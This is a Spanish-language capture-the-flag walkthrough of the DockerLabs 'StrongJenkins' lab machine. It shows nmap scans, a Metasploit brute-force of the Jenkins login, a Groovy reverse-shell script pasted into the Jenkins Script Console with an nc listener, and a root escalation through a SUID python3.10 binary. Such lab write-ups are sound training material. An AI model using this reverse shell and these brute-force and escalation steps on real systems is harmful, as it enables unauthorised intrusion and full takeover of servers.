---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# StrongJenkins DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip strongjenkins.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh strongjenkins.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 09:41 EST
Nmap scan report for 172.17.0.2
Host is up (0.000057s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 10.0.20
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(10.0.20)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.70 seconds
```

Si entramos en la pagina web por el puerto `8080` veremos un `Jenkins`, vamos a probar las credenciales por defecto pero no tendremos suerte, por lo que vamos a realizar fuerza bruta contra el login con `metasploit` de la siguiente forma:

## jenkins\_login Exploit

```shell
msfconsole -q
```

Ahora accederemos al modulo de la siguiente forma:

```shell
use scanner/http/jenkins_login
```

Ahora tendremos que configurarlo:

```shell
set RHOSTS <IP>
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
exploit
```

Info:

```
[!] No active DB -- Credential data will not be saved!
[-] 172.17.0.2:8080 - LOGIN FAILED: admin:123456 (Incorrect)
[-] 172.17.0.2:8080 - LOGIN FAILED: admin:12345 (Incorrect)
[-] 172.17.0.2:8080 - LOGIN FAILED: admin:123456789 (Incorrect)
[-] 172.17.0.2:8080 - LOGIN FAILED: admin:password (Incorrect)
[-] 172.17.0.2:8080 - LOGIN FAILED: admin:iloveyou (Incorrect)
[-] 172.17.0.2:8080 - LOGIN FAILED: admin:princess (Incorrect)
[-] 172.17.0.2:8080 - LOGIN FAILED: admin:1234567 (Incorrect)
[+] 172.17.0.2:8080 - Login Successful: admin:rockyou
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
```

Veremos que hemos encontrado las credenciales, por lo que nos loguearemos con dichas credenciales.

## Escalate user jenkins

```
User: admin
Pass: rockyou
```

Dentro del `jenkins` nos iremos a la pestaña de `Manage Jenkins` y veremos abajo del todo este apartado:

<figure><img src="../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

Entraremos dentro de el y veremos como un recuadro donde meter un script para ejecutar:

```bash
String host="<IP>";
int port=<PORT>;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Pero antes de ejecutar nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y ahora si lo ejecutaremos, por lo que pulsaremos a `run` y si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.60.128] from (UNKNOWN) [172.17.0.2] 49766
whoami
jenkins
```

Veremos que somos el usuario `jenkins` por lo que tendremos que sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si listamos los permisos `SUID` que tenemos, veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
2405051     40 -rwsr-xr-x   1 root     root        40496 Feb  6  2024 /usr/bin/newgrp
  2275789     36 -rwsr-xr-x   1 root     root        35200 Apr  9  2024 /usr/bin/umount
  2275773     56 -rwsr-xr-x   1 root     root        55680 Apr  9  2024 /usr/bin/su
  2275722     48 -rwsr-xr-x   1 root     root        47488 Apr  9  2024 /usr/bin/mount
  2404926     44 -rwsr-xr-x   1 root     root        44808 Feb  6  2024 /usr/bin/chsh
  2404920     72 -rwsr-xr-x   1 root     root        72712 Feb  6  2024 /usr/bin/chfn
  2405062     60 -rwsr-xr-x   1 root     root        59976 Feb  6  2024 /usr/bin/passwd
  2404988     72 -rwsr-xr-x   1 root     root        72072 Feb  6  2024 /usr/bin/gpasswd
  2528496   5768 -rwsr-xr-x   1 root     root      5904904 Nov 20  2023 /usr/bin/python3.10
  2519472     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Si vemos la siguiente linea:

```
2528496   5768 -rwsr-xr-x  1 root  root  5904904 Nov 20  2023 /usr/bin/python3.10
```

Vemos que podemos ejecutar `python3.10` bajo los privilegios de `root`, por lo que haremos lo siguiente:

```shell
python3.10 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

Info:

```
bash-5.1# whoami
root
```

Si ejecutamos esto veremos que seremos el usuario `root`, por lo que habremos terminado la maquina.
